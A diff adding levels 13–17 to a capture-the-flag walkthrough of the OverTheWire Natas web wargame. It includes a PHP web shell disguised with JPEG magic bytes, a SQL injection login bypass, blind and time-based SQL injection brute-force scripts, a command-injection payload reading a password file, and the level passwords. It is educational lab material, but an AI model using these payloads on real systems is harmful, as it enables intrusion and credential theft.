@@ -254,4 +254,158 @@ Now we just have to open the file and we'll se the password:
 
 ### Level 13
 
-Cooming soon.
+This level is like the previous one, but this time they check the signature byte of the file.  
+
+we'll use this python line of code to add what we need:
+```python
+fh.write('\xFF\xD8\xFF\xE0' + '<? passthru($_GET["cmd"]); ?>')
+```
+
+Now we upload the file and intercept the request with BurpSuite like the previous level, and remove the strange character at the beginning of the file
+
+```
+The file upload/<name>.php has been uploaded
+```
+Now we open the file and we'll get the password:
+
+
+> Here's your password for the next level: Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
+
+### Level 14
+
+As we open the level we see a login form.  
+We'll take a look at the source code as always and we will notice that they do some query to a SQL database.  
+
+Obviously we'll need to do some SQLi to exploit this level.  
+
+After running some test, i've found that `"` is unchecked. Easy then.  
+We put the awesome `test"OR "1"="1` in both input and we logon.  
+
+> Successful login! The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
+
+
+### Level 15
+
+As we logon we see an input box and a button, they say that we can check if an user exist.
+
+For this level we'll use a python script and a tecnique called *bruteforce*  
+
+Here's the script:
+
+```python
+import requests
+
+auth_header = {'Authorization':'Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg=='}
+alphanumerics = map(chr, range(65, 91) + range(97,123) + range(48, 58))
+
+def make_url(substr):
+        return "http://natas15.natas.labs.overthewire.org/index.php?debug=true&username=natas16%22%20and%20BINARY%20SUBSTRING%28password,1,%22" + str(len(substr)) + "%22%29=%22" + substr + "%22%20and%20%22a%22=%22a"
+
+def is_success(url):
+    resp = requests.get(make_url(url), headers=auth_header)
+    return "This user exists." in resp.text
+
+password = ""
+
+while len(password) < 32:
+    for char in alphanumerics:
+        print password+char
+        if is_success(password+char):
+            password += char
+            break
+
+    print "Password =", password
+```
+
+Let the script run and at the end you'll get the password:
+
+> Password = WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
+
+
+### Level 16
+
+For this level we'll use the same tools as the one before: python and bruteforce.  
+But this time we'll bruteforce the parameter we give to the `grep`, checking for `hello` as answer.  
+
+Here's the script:
+
+```python
+import requests
+
+auth_header = {'Authorization':'Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA=='}
+alphanumerics = map(chr, range(65, 91) + range(97,123) + range(48, 58))
+
+def make_url(string):
+    return "http://natas16.natas.labs.overthewire.org/index.php?needle=hello$(grep -n " + string + " /etc/natas_webpass/natas17)"
+def is_correct(string):
+    print make_url(string)
+    resp = requests.get(make_url(string), headers=auth_header).text
+    return "hello" not in resp
+# make a list of all possible characters
+print "making a list of all characters in pw file..."
+possible_chars = []
+for char in alphanumerics:
+    if is_correct(char):
+        print char
+        possible_chars.append(char)
+# print out all possible characters
+print possible_chars
+# try to find the full password by appending possible characters to either end of the password we have so far
+password = ""
+while len(password) < 32:
+    print "Password =", password
+    for char in possible_chars:
+        if is_correct(password + char): password = password + char
+        if is_correct(char + password): password = char + password
+
+
+print password
+print "Woohoo!"
+```
+
+Let it run for a bit and at the end you'll ahev the password:
+
+> 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw Woohoo!
+
+
+### Level 17
+
+This level will be a bit tricky.  
+It is like level 15 so we'll use the same tecniques, but this time we will not see the output so we'll do a `blind` bruteforce, using the server responce time as indicator of the right choice of character.
+
+Here's the script:
+
+```python
+
+#blind.py
+import time
+import requests
+from requests.auth import HTTPBasicAuth
+letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+solution = ""
+for x in range(33):
+    for c in letters:
+        payload = {'username': 'natas18" and users.password COLLATE latin1_bin like "'+solution+c+'%'+'"and sleep(10) and "x"="x'}
+        start = time.time()
+        r = requests.post("http://natas17.natas.labs.overthewire.org/", data=payload, auth=HTTPBasicAuth('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'))
+        end = time.time()
+        if int(end-start) >= 4:
+            solution = solution + c
+            print "Solution: " + solution
+            break
+
+
+print "Final: "+solution
+```
+
+I suggest you to run it without other application that use you connection, it is really sensible.
+
+It also take a bit more time than other so i suggest you go and grab a coffee or whatelse.
+When you return you should see this:
+
+> Final: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
+
+
+### Level 18
+
+TODO and cooming soon (but not so soon).
